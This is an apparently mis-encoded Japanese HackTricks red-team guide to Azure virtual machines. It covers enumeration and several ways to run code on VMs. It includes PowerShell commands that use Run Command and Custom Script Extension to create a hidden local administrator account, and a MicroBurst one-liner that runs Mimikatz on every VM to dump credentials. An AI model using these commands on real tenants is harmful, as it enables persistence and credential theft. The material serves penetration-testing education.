# Az - ä»®æƒ³ãƒã‚·ãƒ³ã¨ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‹ã‚‰:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azureã®ä»®æƒ³ãƒã‚·ãƒ³ã¯ã€AzureãŒæä¾›ã™ã‚‹[ã‚ªãƒ³ãƒ‡ãƒãƒ³ãƒ‰ã§ã‚¹ã‚±ãƒ¼ãƒ©ãƒ–ãƒ«ãªã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ãƒªã‚½ãƒ¼ã‚¹](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree)ã®ä¸€ã¤ã§ã™ã€‚é€šå¸¸ã€ä»–ã®é¸æŠè‚¢ã‚ˆã‚Šã‚‚ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ç’°å¢ƒã«å¯¾ã™ã‚‹åˆ¶å¾¡ãŒå¿…è¦ãªå ´åˆã«ä»®æƒ³ãƒã‚·ãƒ³ã‚’é¸æŠã—ã¾ã™ã€‚ã“ã®è¨˜äº‹ã§ã¯ã€ä»®æƒ³ãƒã‚·ãƒ³ã‚’ä½œæˆã™ã‚‹å‰ã«è€ƒæ…®ã™ã¹ãã“ã¨ã€ä½œæˆæ–¹æ³•ã€ãŠã‚ˆã³ç®¡ç†æ–¹æ³•ã«ã¤ã„ã¦ã®æƒ…å ±ã‚’æä¾›ã—ã¾ã™ã€‚

## Azureãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æƒ…å ±

Azureãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«ã¯**ç•°ãªã‚‹ã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã¨æ§‹æˆæ–¹æ³•ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚** ç•°ãªã‚‹Azureãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¨ãƒ³ãƒ†ã‚£ãƒ†ã‚£ã®**ç°¡å˜ãªèª¬æ˜ã€** **ä¾‹**ã€ãŠã‚ˆã³**åˆ—æŒ™**ã‚³ãƒãƒ³ãƒ‰ã¯ä»¥ä¸‹ã«ã‚ã‚Šã¾ã™:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion**ã¯ã€Azureãƒãƒ¼ã‚¿ãƒ«ã‚’ä»‹ã—ã¦SSLçµŒç”±ã§å®‰å…¨ã§å®Œå…¨ã«ç®¡ç†ã•ã‚ŒãŸRDPï¼ˆãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ãƒ—ãƒ­ãƒˆã‚³ãƒ«ï¼‰ãŠã‚ˆã³SSHï¼ˆã‚»ã‚­ãƒ¥ã‚¢ã‚·ã‚§ãƒ«ï¼‰ã‚¢ã‚¯ã‚»ã‚¹ã‚½ãƒªãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æä¾›ã—ã¾ã™ã€‚ã“ã‚Œã¯Azureä»®æƒ³ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã«çµ±åˆã•ã‚Œã¦ãŠã‚Šã€ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆIPã‚’ä½¿ç”¨ã—ã¦VMã¸ã®RDPãŠã‚ˆã³SSHæ¥ç¶šã‚’å¯èƒ½ã«ã—ã€ãƒ‘ãƒ–ãƒªãƒƒã‚¯IPã®å¿…è¦æ€§ã‚’å›é¿ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€VMã‚¢ã‚¯ã‚»ã‚¹ã®ãŸã‚ã®ãƒ‘ãƒ–ãƒªãƒƒã‚¯IPå‰²ã‚Šå½“ã¦ã‚„NSGãƒ«ãƒ¼ãƒ«æ§‹æˆã‚’å«ã‚€å¾“æ¥ã®æ–¹æ³•ã«å¯¾ã™ã‚‹å®‰å…¨ã§ä¾¿åˆ©ãªä»£æ›¿æ‰‹æ®µã¨ãªã‚Šã¾ã™ã€‚é–‹ç™ºè€…ã‚„ITæ‹…å½“è€…ã¯ã€Azureãƒãƒ¼ã‚¿ãƒ«ã‹ã‚‰ã‚¦ã‚§ãƒ–ãƒ–ãƒ©ã‚¦ã‚¶ã‚’ä½¿ç”¨ã—ã¦VMã«å®‰å…¨ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã€é–‹ç™ºãŠã‚ˆã³ãƒ†ã‚¹ãƒˆç’°å¢ƒã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’åŠ¹ç‡åŒ–ã—ã¾ã™ã€‚

ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³å†…ã®ã™ã¹ã¦ã®Azure Bastionãƒ›ã‚¹ãƒˆã‚’ãƒªã‚¹ãƒˆã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã§ãã¾ã™:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM åˆ—æŒ™
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **VMå†…ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹**

### **VMã§ã®AADãƒ­ã‚°ã‚¤ãƒ³**

AzureADã‚’ä»‹ã—ã¦èªè¨¼ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ä¾‹ãˆã°ã€**linux VM**ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹å ´åˆï¼š`ssh username@azure-corp.com@1.1.1.1`ï¼ˆãƒ­ã‚°ã‚¤ãƒ³ã‚’è©¦ã¿ã‚‹éš›ã«ä½¿ç”¨ã—ãŸazurecorpã®**ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’**ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™**ï¼‰ã¨ã„ã†ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ï¼š

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

ãã®**æŒ‡ç¤ºã«å¾“ã£ã¦**ã€[https://microsoft.com/devicelogin](https://microsoft.com/devicelogin)ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã€ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è³‡æ ¼æƒ…å ±ã¨ã—ã¦ä½¿ç”¨ã™ã‚Œã°ã€SSHçµŒç”±ã§æ¥ç¶šã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼ˆãã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ååˆ†ãªæ¨©é™ãŒã‚ã‚‹å ´åˆï¼š`Virtual Machine Administrator Login`ã¾ãŸã¯`Virtual Machine User Login`ãƒ­ãƒ¼ãƒ«ï¼‰ã€‚

### **ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œ**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **ã‚«ã‚¹ã‚¿ãƒ ã‚¹ã‚¯ãƒªãƒ—ãƒˆæ‹¡å¼µã‚’å®Ÿè¡Œã™ã‚‹**

Azureä»®æƒ³ãƒã‚·ãƒ³ï¼ˆVMï¼‰æ‹¡å¼µã¯ã€**Azure VMs**ä¸Šã§ã®ãƒ‡ãƒ—ãƒ­ã‚¤å¾Œã®æ§‹æˆãŠã‚ˆã³è‡ªå‹•åŒ–ã®**ã‚¿ã‚¹ã‚¯**ã‚’æä¾›ã™ã‚‹**å°ã•ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³**ã§ã™ã€‚ãŸã¨ãˆã°ã€ä»®æƒ³ãƒã‚·ãƒ³ã«ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã€ã‚¦ã‚¤ãƒ«ã‚¹å¯¾ç­–ã€ã¾ãŸã¯å†…éƒ¨ã§ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹æ©Ÿèƒ½ãŒå¿…è¦ãªå ´åˆã€VMæ‹¡å¼µã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€æ›¸ãè¾¼ã‚€ã‚¢ã‚¯ã‚»ã‚¹æ¨©ãŒã‚ã‚‹å ´åˆã€ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ï¼š
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) ã¯ã€ã‚³ãƒ¼ãƒ‰ã‚’é€šã˜ã¦ãƒ›ã‚¹ãƒˆã‚’è¨­å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ Ansible ã«ä¼¼ãŸ PowerShell ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚DSC ã¯ Azure ã¨çµ±åˆã•ã‚Œã¦ãŠã‚Šã€ç‰¹å®šã®æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯å³æ ¼ãªæ§‹æ–‡ã«å¾“ã†å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ç‰¹ã«ã€Azure ã® DSC æ‹¡å¼µæ©Ÿèƒ½ã¯ã€ç‰¹å®šã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆåŸºæº–ã‚’æº€ãŸã™ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã€DSC æ¨™æº–ã®æ§‹æ–‡ãŒæ­£ã—ããªãã¦ã‚‚å®Ÿè¡Œã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã‚Œã‚‰ã®ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œã¯ã€Az PowerShell ã® [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) é–¢æ•°ã«ã‚ˆã£ã¦ä¿ƒé€²ã•ã‚Œã¾ã™ã€‚è¦ä»¶ã«ã¯ã€å®šç¾©ã•ã‚ŒãŸé–¢æ•°ã‚’æŒã¤ **.PS1** ãƒ•ã‚¡ã‚¤ãƒ«ãŒå«ã¾ã‚Œã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯ **.zip** ãƒ•ã‚¡ã‚¤ãƒ«ã«åœ§ç¸®ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æ§‹æ–‡ãŒ DSC ã«å¯¾ã—ã¦æ­£ç¢ºã§ãªãã¦ã‚‚ã€ã‚³ãƒ¼ãƒ‰ã¯å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ãŸã ã—ã€æ‹¡å¼µæ©Ÿèƒ½ã¯å®Ÿè¡Œã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’ã€Œå¤±æ•—ã€ã¨ã—ã¦ãƒãƒ¼ã‚¯ã—ã€ã‚³ãƒãƒ³ãƒ‰ã‹ã‚‰ã®å‡ºåŠ›ã¯å¤±æ•—ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã«ã‚ˆã£ã¦ä¸Šæ›¸ãã•ã‚Œã‚‹ãŸã‚è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã€‚

### VM Application Definitions

VM Application Definitions ã¯ã€ãƒãƒ¼ã‚¸ãƒ§ãƒ³ç®¡ç†ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ Azure VM ã«ç¹°ã‚Šè¿”ã—ãƒ‡ãƒ—ãƒ­ã‚¤ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã®ãƒªã‚½ãƒ¼ã‚¹ã¯ã€VM å…¨ä½“ã§ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ‡ãƒ—ãƒ­ã‚¤ã¨æ›´æ–°ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¾ã™ã€‚ã“ã‚Œã‚’è¨­å®šã™ã‚‹ã«ã¯ã€Az PowerShell ã® **`New-AzGalleryApplication`** ãŠã‚ˆã³ **`New-AzGalleryApplicationVersion`** ãªã©ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å«ã‚€ã„ãã¤ã‹ã®æ‰‹é †ãŒå¿…è¦ã§ã™ã€‚

ã“ã®æ–¹æ³•ã§ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚„ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒ VM ã«é©ç”¨ã•ã‚Œã‚‹ã¨è‡ªå‹•çš„ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã‚‹ **"VMAppExtension"** ãŒé–¢ä¸ã—ã¾ã™ã€‚æ‹¡å¼µæ©Ÿèƒ½ã¯ã€æŒ‡å®šã•ã‚ŒãŸ URI ã‹ã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å–å¾—ã—ã€æ‹¡å¼µå­ãªã—ã§ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨åŒã˜åå‰ã‚’ä»˜ã‘ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ­£ã—ãå®Ÿè¡Œã™ã‚‹ã«ã¯ã€REST API å‘¼ã³å‡ºã—ã® "ManageActions" ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’é©åˆ‡ãªæ‹¡å¼µå­ã§ãƒ•ã‚¡ã‚¤ãƒ«ã®åå‰ã‚’å¤‰æ›´ã™ã‚‹ã‚ˆã†ã«è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®æ–¹æ³•ã®è¨­å®šãŒå®Œäº†ã™ã‚‹ã¨ã€æä¾›ã•ã‚ŒãŸå›³ã«ç¤ºã•ã‚Œã¦ã„ã‚‹æ§‹é€ ã«ä¼¼ãŸã‚‚ã®ã«ãªã‚Šã¾ã™ã€‚

ãŸã ã—ã€ã“ã®å®Ÿè¡Œæ–¹æ³•ã¯æ¯”è¼ƒçš„é…ãã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚„ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã®ã«ç´„ 3-4 åˆ†ã‹ã‹ã‚Šã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã«é–¢é€£ã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€ç‰¹å®šã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ä¿å­˜ã•ã‚Œã¾ã™ï¼ˆã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ”ãƒ¼ç”¨ã® `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` ã¨ã€å®Ÿè¡Œã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ç”¨ã® `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`ï¼‰ã€‚

ä¸¡æ–¹ã®æŠ€è¡“ã¯ã€Azure ç’°å¢ƒã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ãƒ‡ãƒ—ãƒ­ã‚¤ã™ã‚‹ãŸã‚ã®ç‹¬è‡ªã®æ–¹æ³•ã‚’æä¾›ã—ã€ãã‚Œãã‚Œã«ç‹¬è‡ªã®è¦ä»¶ã€æ‰‹é †ã€ãŠã‚ˆã³è€ƒæ…®äº‹é …ãŒã‚ã‚Šã¾ã™ã€‚

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) ã¯ã€Automation Account ã§æ§‹æˆã•ã‚ŒãŸ Runbook ã‚’æŒ‡å®šã•ã‚ŒãŸ HWG ã®ä¸€éƒ¨ã§ã‚ã‚‹ Azure Virtual Machine (VM) ã§å®Ÿè¡Œã§ãã‚‹ Azure ã®æ©Ÿèƒ½ã§ã™ã€‚ã“ã®å®Ÿè¡Œã¯ã€VM ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸæ‹¡å¼µæ©Ÿèƒ½ã‚’é€šã˜ã¦ä¿ƒé€²ã•ã‚Œã€Runbook ã‚³ãƒ¼ãƒ‰ãŒ VM ã«ãƒ‡ãƒ—ãƒ­ã‚¤ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã®é‡è¦ãªå´é¢ã¯ã€å®Ÿéš›ã®è³‡æ ¼æƒ…å ±ãŒå®Ÿè¡Œã«å½±éŸ¿ã—ãªã„ã“ã¨ã§ã™ã€‚ãªãœãªã‚‰ã€ã‚³ãƒ¼ãƒ‰ã¯ç‰¹æ¨©æ˜‡æ ¼ã•ã‚ŒãŸçŠ¶æ…‹ã§å®Ÿè¡Œã•ã‚Œã€å…·ä½“çš„ã«ã¯ **SYSTEM** ã¾ãŸã¯ root ã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã‚‹ã‹ã‚‰ã§ã™ã€‚

Windows 10 VM ã‚’åˆ©ç”¨ã™ã‚‹äººã«ã¨ã£ã¦é‡è¦ãªè©³ç´°ã¯ã€Runbook ã® PowerShell ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’æŒ‡å®šã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯ PowerShell ãƒãƒ¼ã‚¸ãƒ§ãƒ³ 5.1 ã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ã«è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€PowerShell 7.1 ãŒã“ã‚Œã‚‰ã® VM ã«ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ãªã„ãŸã‚ã€ãƒãƒ¼ã‚¸ãƒ§ãƒ³ 7.1 ãŒæŒ‡å®šã•ã‚Œã‚‹ã¨ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡ŒãŒå¤±æ•—ã™ã‚‹ãŸã‚ã§ã™ã€‚

Azure ã®ã“ã®æ©Ÿèƒ½ã¯ã€ãƒã‚¤ãƒ–ãƒªãƒƒãƒ‰ç’°å¢ƒå…¨ä½“ã§ã®ã‚¿ã‚¹ã‚¯ã®è‡ªå‹•åŒ–ã¨ç®¡ç†ã®ãŸã‚ã®å …ç‰¢ãªæ–¹æ³•ã‚’æä¾›ã—ã€Azure VM ä¸Šã§ã®ã‚¿ã‚¹ã‚¯ã®é›†ä¸­ç®¡ç†ã¨å®Ÿè¡Œã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
